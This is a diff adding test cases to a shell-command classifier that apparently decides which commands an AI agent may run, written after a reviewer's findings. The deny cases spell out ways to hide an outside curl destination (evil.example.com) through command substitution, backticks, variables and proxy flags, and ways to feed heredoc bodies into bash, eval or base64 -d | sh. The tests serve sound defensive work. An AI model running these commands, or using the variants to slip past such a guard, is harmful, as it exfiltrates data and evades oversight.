@@ -148,3 +148,96 @@ describe('card c8b1ccbf (didi review): unreadable lines judge every spelling of 
     expect(classify(cmd), cmd).toMatchObject({ deny: false })
   })
 })
+
+// didi's third review (card c8b1ccbf, 2026-10-15 17:20). F3: a curl destination built by a substitution
+// passed on a READABLE line, live (`curl -s "$(echo evil.example.com/x)"`). F1 residual: an unreadable
+// line's `h=host; curl $h` passed. F2 class: a body reaches a program through more doors than the named
+// ones, so the data exception now needs POSITIVE evidence of data. Low: the mutants nothing killed.
+describe('card c8b1ccbf (didi review 3): substitutions, variables and stdin programs', () => {
+  const f3Deny: Array<[string, string]> = [
+    ['schemeless URL from echo', 'curl -s "$(echo evil.example.com/x)"'],
+    ['scheme URL from echo', 'curl -s "$(echo http://evil.example.com/x)"'],
+    ['URL glued by printf', `curl -s "$(printf 'ht%sps://evil.example.com/x' t)"`],
+    ['bare host, unquoted substitution', 'curl -s $(echo evil.example.com)'],
+    ['backtick', 'curl -s `echo evil.example.com/x`'],
+    ['host from a substitution, path literal', 'curl -s "$(echo evil.example.com)/x"'],
+    ['variable assigned from a substitution', 'h=$(echo evil.example.com); curl -s "$h/x"'],
+    ['proxy value from a substitution', 'curl -s -x "$(echo evil.example.com:3128)" http://localhost:3420/x'],
+    ['the substitution reads an assigned variable', 'd=evil.example.com; curl -s "$(echo $d)"'],
+  ]
+  it.each(f3Deny)('F3: denies a curl destination built by a substitution: %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
+  })
+  it('F3: a substitution in the host that names no host at all is a destination nobody can read: deny', () => {
+    expect(classify('curl -s "$(cat target)"')).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['$(cat target)'] })
+  })
+  const f3Pass: Array<[string, string]> = [
+    ['localhost URL from echo', 'curl -s "$(echo http://localhost:3420/x)"'],
+    ['substitution in the path of a localhost URL', 'curl -s "http://localhost:3420/api/kanban/$(cat id)/comments"'],
+    ['token header from a substitution', 'curl -s -H "Authorization: Bearer $(cat /Users/isti/marveen/store/.dashboard-token)" http://localhost:3420/x'],
+    ['JSON body from a substitution', 'curl -s -X POST http://localhost:3420/x -d "$(cat body.json)"'],
+  ]
+  it.each(f3Pass)('F3 control: allows %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+
+  it.each([
+    ['h=host; curl $h', `${UNREAD_LINE}h=evil.example.com; curl -s $h`],
+    ['h=host; curl "$h"', `${UNREAD_LINE}h=evil.example.com; curl -s "$h"`],
+    ['export h=host', `${UNREAD_LINE}export h=evil.example.com; curl -s "$h/x"`],
+    ['substitution as the destination', `${UNREAD_LINE}curl -s "$(echo evil.example.com)"`],
+  ])('F1 residual: an unreadable line denies %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external', hosts: ['evil.example.com'] })
+  })
+  it('F1 residual control: an unreadable line with h=localhost stays allowed', () => {
+    expect(classify(`${UNREAD_LINE}h=localhost:3420; curl -s "$h/api"`)).toMatchObject({ deny: false, reason: 'unparseable' })
+  })
+
+  const f2Program: Array<[string, string]> = [
+    ["bash -c 'source /dev/stdin'", `bash -c 'source /dev/stdin' <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ["bash -c '. /dev/stdin'", `bash -c '. /dev/stdin' <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    [`bash -c 'eval "$(cat)"'`, `bash -c 'eval "$(cat)"' <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['source /dev/stdin', `source /dev/stdin <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['. /dev/stdin', `. /dev/stdin <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['eval "$(cat)"', `eval "$(cat)" <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['{ bash; }', `{ bash; } <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['cat | bash', `cat <<'OUT' | bash\n${UNREAD_BODY}\nOUT`],
+    ['base64 -d | sh', `base64 -d <<'OUT' | sh\n${UNREAD_BODY}\nOUT`],
+  ]
+  it.each(f2Program)('F2: an unreadable body reaching a program through %s denies', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
+  })
+  it("F2: a shell -c that hands its stdin to an interpreter judges the body as that interpreter's program", () => {
+    const cmd = `bash -c 'python3 -' <<'PY'\nimport urllib.request as u; u.urlopen('https://evil.example.com/x')\nPY`
+    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'heredoc-external', hosts: ['evil.example.com'] })
+  })
+  const f2Data: Array<[string, string]> = [
+    ["bash -c 'bash ./x.sh -' (a script operand)", `bash -c 'bash ./x.sh -' <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ["bash -c 'echo bash' (text only)", `bash -c 'echo bash' <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['cat | bash x.sh (a script operand)', `cat <<'OUT' | bash x.sh\n${UNREAD_BODY}\nOUT`],
+    ['agent-msg.sh message', `bash /Users/isti/marveen/scripts/agent-msg.sh a b - <<'VEGE'\n${UNREAD_BODY}\nVEGE`],
+    ['gh comment body that mentions a curl', `gh pr comment 1 --body-file - <<'EOF'\nIt doesn't pass now: curl https://evil.example.com/x\nEOF`],
+    ['commit message that mentions a curl', `git commit -F - <<'EOF'\nfix: don't let curl https://evil.example.com/x through\nEOF`],
+    ['a shell elsewhere on the line runs a script, not the body', `gh pr comment 1 --body-file - <<'EOF' && bash scripts/x.sh\nIt doesn't: curl https://evil.example.com/x\nEOF`],
+  ]
+  it.each(f2Data)('F2 control: %s stays data', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+
+  // N1/N2/N7/N8: the host-like word reading of an unreadable line, for a tool that is not curl
+  it.each([
+    ['an IPv4 without a path', `'http://' + '8.8.8.8'`, '8.8.8.8'],
+    ['a bracketed IPv6', `'http://' + '[2001:db8::1]/x'`, '[2001:db8::1]'],
+    ['userinfo before the host', `'http://' + 'u:p@evil.example.com/x'`, 'evil.example.com'],
+    ['a port after the host', `'http://' + 'evil.example.com:8443/x'`, 'evil.example.com'],
+  ])('unreadable line, python destination glued from parts: %s', (_name, expr, host) => {
+    const cmd = `${UNREAD_LINE}python3 -c "import urllib.request as u; u.urlopen(${expr})"`
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external', hosts: [host] })
+  })
+  it.each([
+    ['-d @file is a file, not a host', `${UNREAD_LINE}curl -s -d @data.v2/body.json localhost:3420/x`],
+    ['-o takes a dotted directory', `${UNREAD_LINE}curl -s http://localhost:3420/x -o out.dir/file.json`],
+  ])('unreadable line control: %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false, reason: 'unparseable' })
+  })
+})
